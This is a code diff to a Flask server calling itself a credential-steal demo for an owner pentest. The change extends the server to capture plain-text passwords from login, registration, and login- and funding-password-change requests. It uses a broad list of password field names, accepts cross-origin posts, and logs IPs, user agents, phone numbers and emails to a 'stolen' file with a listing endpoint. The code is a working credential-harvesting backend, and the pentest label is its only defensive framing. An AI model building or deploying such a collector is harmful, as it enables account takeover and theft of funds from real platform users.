@@ -1,6 +1,6 @@
 """
 THSEX credential-steal demo server (OWNER PENTEST ONLY).
-Shows that login passwords arrive PLAIN TEXT to attacker — not hashed on client.
+Captures plain-text passwords from login, register, and password-change flows.
 """
 import json
 import os
@@ -16,6 +16,24 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 DATA_DIR = Path(__file__).parent / "data"
 DATA_DIR.mkdir(exist_ok=True)
 LOG_FILE = DATA_DIR / "stolen.jsonl"
+
+PASSWORD_KEYS = (
+    "password",
+    "pwd",
+    "pass",
+    "oldPassword",
+    "newPassword",
+    "confirmPassword",
+    "old_password",
+    "new_password",
+    "confirm_password",
+    "fundingPassword",
+    "fundPassword",
+    "oldFundingPassword",
+    "newFundingPassword",
+    "payPassword",
+    "tradePassword",
+)
 
 
 def log_stolen(entry: dict) -> None:
@@ -35,40 +53,66 @@ def read_all() -> list:
     return rows
 
 
+def extract_passwords(data: dict) -> dict:
+    found = {}
+    for key in PASSWORD_KEYS:
+        val = data.get(key)
+        if val:
+            found[key] = val
+    return found
+
+
+def infer_action(data: dict, path: str) -> str:
+    action = data.get("action")
+    if action:
+        return str(action)
+    if "steal-login" in path:
+        return "login"
+    return "unknown"
+
+
 @app.route("/")
 def health():
+    rows = read_all()
     return jsonify(
         {
             "service": "thsex-steal-demo",
-            "warning": "PENTEST DEMO ONLY — passwords stored plain to prove risk",
+            "warning": "PENTEST DEMO ONLY",
             "endpoints": {
-                "steal": "POST /steal",
-                "steal_login": "POST /api/steal-login",
+                "steal": "POST /api/steal",
+                "steal_login": "POST /api/steal-login (legacy)",
                 "list": "GET /api/stolen",
+                "panel": "GET /panel",
             },
-            "count": len(read_all()),
+            "hooks": ["login", "register", "change_login_password", "change_fund_password"],
+            "count": len(rows),
         }
     )
 
 
 @app.route("/steal", methods=["POST", "OPTIONS"])
+@app.route("/api/steal", methods=["POST", "OPTIONS"])
 @app.route("/api/steal-login", methods=["POST", "OPTIONS"])
 def steal():
     if request.method == "OPTIONS":
         return "", 204
     data = request.get_json(silent=True) or {}
+    action = infer_action(data, request.path)
+    passwords = extract_passwords(data)
     entry = {
+        "action": action,
         "path": request.path,
         "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
         "user_agent": request.headers.get("User-Agent", ""),
         "payload": data,
-        "password_plain": data.get("password") or data.get("pwd") or data.get("pass"),
+        "passwords_plain": passwords,
+        "password_plain": data.get("password") or data.get("newPassword") or data.get("pwd"),
         "mobile": data.get("mobile") or data.get("phone"),
         "email": data.get("email"),
-        "note": "Client sends password BEFORE server hashing — attacker sees plain text",
+        "note": "All password fields arrive PLAIN TEXT from client before server hashing",
     }
     log_stolen(entry)
-    return jsonify({"code": 0, "success": True, "msg": "logged"})
+    return jsonify({"code": 0, "success": True, "msg": "logged", "action": action})
 
 
 @app.route("/api/stolen", methods=["GET"])
